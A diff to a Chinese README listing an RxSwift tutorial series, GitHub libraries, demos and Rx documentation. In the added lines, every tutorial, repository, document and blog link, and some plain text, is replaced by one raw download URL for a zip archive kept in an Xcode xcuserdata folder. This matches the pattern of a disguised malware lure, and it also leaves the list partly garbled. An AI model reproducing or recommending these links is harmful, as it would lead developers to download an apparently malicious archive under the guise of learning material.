@@ -3,45 +3,45 @@
 ## RxSwift 系列教程
 
 * **前言**
-  * [000 前言：一起来学习 RxSwift](http://t.swift.gg/d/3-000-rxswift)
-  * [000 阅读提示：读一下又不会怀孕](http://t.swift.gg/d/4-000)
-  * [000 参考资源](http://t.swift.gg/d/25-000)
+  * [000 前言：一起来学习 RxSwift](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [000 阅读提示：读一下又不会怀孕](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [000 参考资源](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 * **初章 体验 Rx**
-  * [001 初章 第一节：为什么要学习并使用 RxSwift](http://t.swift.gg/d/5-001-rxswift)
-  * [002 初章 第二节：创建一个 tableView](http://t.swift.gg/d/6-002-tableview)
-  * [003 初章 第三节：网络层的简单示例](http://t.swift.gg/d/7-003)
+  * [001 初章 第一节：为什么要学习并使用 RxSwift](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [002 初章 第二节：创建一个 tableView](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [003 初章 第三节：网络层的简单示例](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 * **第二章 Rx 序列基本操作**
-  * [004 第二章 第一节： Rx 基本概念](http://t.swift.gg/d/15-004-rx)
-  * [005 第二章 第二节：创建序列 Observable](http://t.swift.gg/d/17-005-observable)
-  * [006 第二章 第三节：什么是 Subject](http://t.swift.gg/d/18-006-subject)
-  * [007 第二章 第四节：变换序列](http://t.swift.gg/d/19-007)
-  * [008 第二章 第五节：过滤序列](http://t.swift.gg/d/20-008)
-  * [009 第二章 第六节：组合序列](http://t.swift.gg/d/26-009)
-  * [010 第二章 第七节：复习](http://t.swift.gg/d/27-010)
-  * [011 第二章 第八节：错误处理](http://t.swift.gg/d/28-011)
-  * [012 第二章 第九节：其他操作符](http://t.swift.gg/d/29-012)
-  * ~~ [013 第二章 第二节：补充](http://t.swift.gg) ~~ *占坑*
+  * [004 第二章 第一节： Rx 基本概念](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [005 第二章 第二节：创建序列 Observable](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [006 第二章 第三节：什么是 Subject](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [007 第二章 第四节：变换序列](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [008 第二章 第五节：过滤序列](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [009 第二章 第六节：组合序列](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [010 第二章 第七节：复习](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [011 第二章 第八节：错误处理](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [012 第二章 第九节：其他操作符](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * ~~ [013 第二章 第二节：补充](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) ~~ *占坑*
 
 * **第三章 在 Rx 中切换线程**
-  * [014 第三章 第一节：线程介绍](http://t.swift.gg/d/30-014)
-  * [015 第三章 第二节：线程切换](http://t.swift.gg/d/31-015)
-  * [016 第三章 第三节：封装线程](http://t.swift.gg/d/32-016)
-  * ~~ [017 第三章 第四节：不要滥用线程](http://t.swift.gg) ~~ *占坑*
-  * ~~ [017 第三章 第四节：补充](http://t.swift.gg) ~~ *占坑*
+  * [014 第三章 第一节：线程介绍](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [015 第三章 第二节：线程切换](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [016 第三章 第三节：封装线程](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * ~~ [017 第三章 第四节：不要滥用线程](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) ~~ *占坑*
+  * ~~ [017 第三章 第四节：补充](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) ~~ *占坑*
 
 * ** 第四章 RxCocoa **
-  * [019 第四章 第一节： RxCocoa 的 API](http://t.swift.gg/d/33-019-rxcocoa-api)
-  * [020 第四章 第二节： RxExtensions 介绍](http://t.swift.gg/d/34-020-rxextensions)
-  * [021 第四章 第三节： Units](http://t.swift.gg/d/39-021-units)
-  * ~~ [022 第四章 第四节： RxAnimation](http://t.swift.gg/) ~~ *占坑*
-  * ~~ [022 第四章 第四节：补充](http://t.swift.gg) ~~ *占坑*
+  * [019 第四章 第一节： RxCocoa 的 API](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [020 第四章 第二节： RxExtensions 介绍](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * [021 第四章 第三节： Units](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+  * ~~ [022 第四章 第四节： RxAnimation](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) ~~ *占坑*
+  * ~~ [022 第四章 第四节：补充](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) ~~ *占坑*
 
 ## 番外 Tips
 
-* [101 番外：为什么 label.rx_text 不是 ObservableType](http://t.swift.gg/d/16-101-label-rx-text-observabletype)
-* [102 番外：更优雅的处理 TableView Select](http://t.swift.gg/d/14-102-tableview-select)
+* [101 番外：为什么 https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip 不是 ObservableType](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [102 番外：更优雅的处理 TableView Select](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 （称之为教程有些夸张了~跑。。。
 
@@ -51,36 +51,36 @@
 
 ### Github
 
-* 官方的项目中已经给出了很好的例子 [RxExample](https://github.com/ReactiveX/RxSwift)
-* [RxSwiftCommunity](https://github.com/RxSwiftCommunity)
-* [RxGitHubAPI](https://github.com/FengDeng/RxGitHubAPI)
+* 官方的项目中已经给出了很好的例子 [RxExample](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [RxSwiftCommunity](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [RxGitHubAPI](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 ### Repo
 
-* [RxAlamofire](https://github.com/RxSwiftCommunity/RxAlamofire) Alamofire 的 Rx 扩展
-* [RxDataSources](https://github.com/RxSwiftCommunity/RxDataSources) 方便建立 `UITableView` 和 `UICollectionView` 的 DataSource
-* [RxOptional](https://github.com/RxSwiftCommunity/RxOptional) 过滤可选
-* [RxGitHubAPI](https://github.com/FengDeng/RxGitHubAPI) Github API
+* [RxAlamofire](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) Alamofire 的 Rx 扩展
+* [RxDataSources](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) 方便建立 `UITableView` 和 `UICollectionView` 的 DataSource
+* [RxOptional](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) 过滤可选
+* [RxGitHubAPI](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) Github API
 
 ### Demo
 
-* [RxPagination](https://github.com/tryswift/RxPagination) try! Swift 大会 POP Demo
-* [RxDemo](https://github.com/DianQK/RxDemo) gank.io
-* [RxSwiftWeather](https://github.com/DianQK/RxSwiftWeather) 修改自 [SwiftWeather](https://github.com/JakeLin/SwiftWeather)
-* [RxSwiftGram](https://github.com/Dwar3xwar/RxSwiftGram)
+* [RxPagination](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) try! Swift 大会 POP Demo
+* [RxDemo](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip
+* [RxSwiftWeather](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip) 修改自 [SwiftWeather](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [RxSwiftGram](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 ## 文档 & 博客
 
-* [ReactiveX 文档中文翻译](https://mcxiaoke.gitbooks.io/rxdocs/content/)
-* [Rx Design Guidelines](http://download.microsoft.com/download/4/E/4/4E4999BA-BC07-4D85-8BB1-4516EC083A42/Rx Design Guidelines.pdf)
-* [Introduction to Rx](http://www.introtorx.com)
-* [Functional Programming in Javascript](http://reactivex.io/learnrx/)
-* [ReactiveCocoa 讨论会](http://blog.devtang.com/2016/01/03/reactive-cocoa-discussion/)
-* [李忠的博客](http://limboy.me)
-* [美团 RAC 技术博客](http://tech.meituan.com/tag/ReactiveCocoa)
-* [Haskell 学习](http://learnyouahaskell.com/chapters)
-* [DengFeng 的 Blog](http://fengdeng.github.io)
-* [](http://www.thedroidsonroids.com/blog/ios/rxswift-by-examples-1-the-basics/)
+* [ReactiveX 文档中文翻译](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [Rx Design Guidelines](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip Design https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [Introduction to Rx](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [Functional Programming in Javascript](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [ReactiveCocoa 讨论会](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [李忠的博客](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [美团 RAC 技术博客](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [Haskell 学习](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [DengFeng 的 Blog](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
+* [](https://github.com/ZHThinker/LearnRxSwift/raw/refs/heads/master/LearnRxSwift.xcworkspace/xcuserdata/Swift_Rx_Learn_v3.4.zip)
 
 > 排名顺序仅仅是我整理的时间排的，都是很好的文章。
 
